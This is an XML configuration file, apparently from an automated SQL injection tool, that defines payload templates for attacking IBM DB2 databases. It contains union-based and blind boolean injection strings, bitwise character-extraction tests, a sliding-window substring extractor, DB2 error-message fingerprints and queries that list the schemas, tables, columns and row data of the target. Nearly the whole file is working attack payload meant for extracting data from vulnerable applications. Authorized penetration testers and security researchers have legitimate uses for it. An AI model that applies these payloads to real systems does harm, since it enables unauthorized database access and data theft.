<?xml version="1.0" encoding="UTF-8"?>
<model>
    <vendor></vendor>
    <resource>
        <info>
select 
    versionnumber
    || '${ENCLOSE_VALUE_SQL}'
    || current server
    || '${ENCLOSE_VALUE_SQL}'
    || user
    || '${TRAIL_SQL}'
from sysibm.sysversions
        </info>
        <schema>
            <database>
select varchar(
    LISTAGG(
        '${ENCLOSE_VALUE_SQL}'
        || trim(schemaname)
        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
    )
    || '${TRAIL_SQL}'
)
from syscat.schemata
{limit}
            </database>
            <table>
select varchar(
    LISTAGG(
        '${ENCLOSE_VALUE_SQL}'
        || trim(name)
        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
    )
    || '${TRAIL_SQL}'
)
from sysibm.systables 
where creator = '${DATABASE}'
{limit}
            </table>
            <column>
select varchar(
    LISTAGG(
        '${ENCLOSE_VALUE_SQL}'
        || trim(name)
        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
    )
    || '${TRAIL_SQL}'
)
from sysibm.syscolumns
where coltype != 'BLOB'
and tbcreator = '${DATABASE}'
and tbname = '${TABLE}'
{limit}
            </column>
            <row>
                <query>
/**
 * LISTAGG limit is 4000 and aggregate all data before limit is applied
 * => subquery
 */
select varchar(
    LISTAGG(
        '${ENCLOSE_VALUE_SQL}'
        || s
        || '${SEPARATOR_QTE_SQL}1${ENCLOSE_VALUE_SQL}'
    )
    || '${TRAIL_SQL}'
)
from (
    select ${FIELDS} s
    from ${DATABASE}.${TABLE}
    {limit}
)
                </query>
                <fields>
                <field>
trim(
    coalesce(
        varchar(
            ${FIELD} 
            || ''
        ), 
        ''
    )
)
                </field>
                <concat>|| '%7f' ||</concat>
                </fields>
            </row>
        </schema>
    </resource>
    <strategy>
        <configuration>
            <slidingWindow>
(
    select
        varchar(
            replace(
                '${LEAD}'
                || substr (
                    (${INJECTION}),
                    ${INDEX}
                ),
                '${LEAD}${TRAIL_SQL}',
                '${LEAD}'
            )
        )
    from sysibm.sysdummy1
)
            </slidingWindow>
            <limit>limit ${LIMIT}, 5</limit>
            <failsafe>varchar('' || (1337${INDICE}7330%2b1), 1024)</failsafe>
            <calibrator>
rpad(
    '${CALIBRATOR_SQL}', 
    1024, 
    '${CALIBRATOR_SQL}'
)
            </calibrator>
            <limitBoundary>0</limitBoundary>
            <endingComment>--+</endingComment>
            <fingerprint>
                <errorMessage>function.db2</errorMessage>
                <errorMessage>DB2 SQL Error</errorMessage>
                <errorMessage>Warning: db2_execute()</errorMessage>
                <errorMessage>Warning: db2_fetch_array()</errorMessage>
            </fingerprint>
        </configuration>
        <normal>
            <indices>union select ${INDICES} from sysibm.sysdummy1</indices>
            <capacity>
/**
 * repeat gets internal table size error on blind 'where 1=1'
 * => uses rpad instead
 */
varchar('${LEAD}${INDICE}' || ${CALIBRATOR}, 1024)            
            </capacity>
            <orderBy>order by 1337</orderBy>
        </normal>
        <boolean>
            <test>
                <false>1 = 0</false>
                <false>'a' %21= 'a'</false>
                <false>'b' %21= 'b'</false>
                <false>1 = 2</false>
                <false>1 %21= 1</false>
                <false>2 %21= 2</false>
                <true>0 = 0</true>
                <true>'a' %21= 'b'</true>
                <true>'a' = 'a'</true>
                <true>1 = 1</true>
                <true>2 = 2</true>
                <true>1 %21= 2</true>
                <initialization>0%2b1 = 1</initialization>
                <bit>
0 != BITAND(
    ascii(
        substr(
            ${INJECTION}, 
            ${INDEX}, 
            1
        )
    ), 
    ${BIT}
)
                </bit>
                <length>length(${INJECTION}) > ${INDEX}</length>
            </test>
            <blind>and ${TEST}</blind>
        </boolean>
    </strategy>
</model>